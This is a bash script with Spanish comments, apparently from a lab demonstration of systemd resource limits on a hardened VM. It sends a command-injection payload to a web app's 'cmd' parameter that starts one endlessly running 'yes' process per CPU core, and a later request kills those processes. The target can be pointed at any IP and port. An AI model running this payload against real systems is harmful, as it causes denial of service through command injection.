#!/usr/bin/env bash
# =============================================================================
# ATAQUE 3 (VERSION PELIGROSA) - SATURACION DE CPU / DENEGACION DE SERVICIO
# Prueba: limites de systemd -> CPUQuota (y de fondo, TasksMax, MemoryMax)
# Idea: una app comprometida intenta agotar los recursos de la maquina. El SO
#       blindado le pone un techo (cgroups) y el resto del sistema sigue vivo.
#
# DIFERENCIA CON ataque3.sh (la version normal):
#   - ataque3.sh lanza 300 procesos 'sleep 300', que casi no consumen CPU/RAM
#     y se autodestruyen solos a los 5 minutos aunque nadie limpie.
#   - ESTA version lanza $(nproc) procesos 'yes' (uno por nucleo del SERVIDOR),
#     que son 100% CPU-bound y NO se autodestruyen nunca: corren para siempre
#     hasta que algo los mate. Por eso el efecto en htop es mucho mas fuerte
#     (las barras de CPU se van al 100% en todos los nucleos) pero TAMBIEN es
#     mas peligroso: si no se presiona ENTER para limpiar, la maquina se queda
#     quemando CPU indefinidamente.
#
# RED DE SEGURIDAD SI SE TRABA: esto solo afecta a los recursos (RAM/vCPU)
#       asignados a ESTA VM en VirtualBox, nunca a la maquina principal. Si la
#       VM deja de responder, desde la ventana de VirtualBox Manager (en el
#       host, fuera de la VM): clic derecho -> Cerrar -> Apagar la maquina.
#
# IMPORTANTE (por que cada yes lleva '>/dev/null 2>&1'):
#       Si no redirigimos su salida, los procesos 'yes' heredan la tuberia de
#       la app y la mantienen abierta; la app se queda esperando el fin de la
#       lectura y el curl NUNCA responde (se cuelga, igual que paso con
#       ataque3.sh antes de arreglarlo). Al mandar su salida a /dev/null,
#       sueltan la tuberia: la app responde al instante y los yes igual siguen
#       quemando CPU en segundo plano.
#
# Uso:  ./ataque3_version_peligrosa.sh            (ataca localhost:8080)
#       ./ataque3_version_peligrosa.sh IP:PUERTO  (ataca otra maquina)
# =============================================================================

TARGET="${1:-localhost:8080}"
API="http://$TARGET/api/test"

echo "################ ATAQUE 3 (VERSION PELIGROSA) - QUEMA DE CPU (contra $TARGET) ################"
echo

# --- Parte principal: quema de CPU en todos los nucleos (prueba CPUQuota) ----
echo ">> La app lanzara un proceso 'yes' por cada nucleo del servidor (satura CPU)."
echo ">> Maquina SIN proteccion: los 100% de TODOS los nucleos, sin limite."
echo ">> Maquina BLINDADA: CPUQuota de systemd la topa (p. ej. al 80%)."
echo "--------------------------------------------------------------"
curl -s -G "$API" --data-urlencode \
  'cmd=for i in $(seq 1 $(nproc)); do yes >/dev/null 2>&1 & done; echo "quemando CPU en $(nproc) nucleos; mira htop"'
echo
echo
echo ">> AHORA, en otra terminal de ESTA maquina, observa la evidencia:"
echo "     pgrep -u \$(whoami) -x yes | wc -l   (conteo exacto de yes)"
echo "     htop  -> F4, escribe 'yes'           (verlos filtrados, CPU al 100%)"
echo "     journalctl -u digitalhealth -n 20    (en la blindada: systemd limitando)"
echo
echo ">> ADVERTENCIA: a diferencia de la version normal, esto NO se detiene solo."
echo "   La VM seguira lenta/laggy hasta que presiones ENTER para limpiar."
echo

read -p ">> Cuando termines de explicar, presiona ENTER para LIMPIAR... " _

# --- Limpieza: matar los procesos 'yes' para devolver la CPU a la normalidad -
curl -s -G "$API" --data-urlencode 'cmd=pkill -u $(whoami) -x yes; echo "CPU liberada"'
echo
echo "################ FIN ATAQUE 3 (VERSION PELIGROSA) ################"
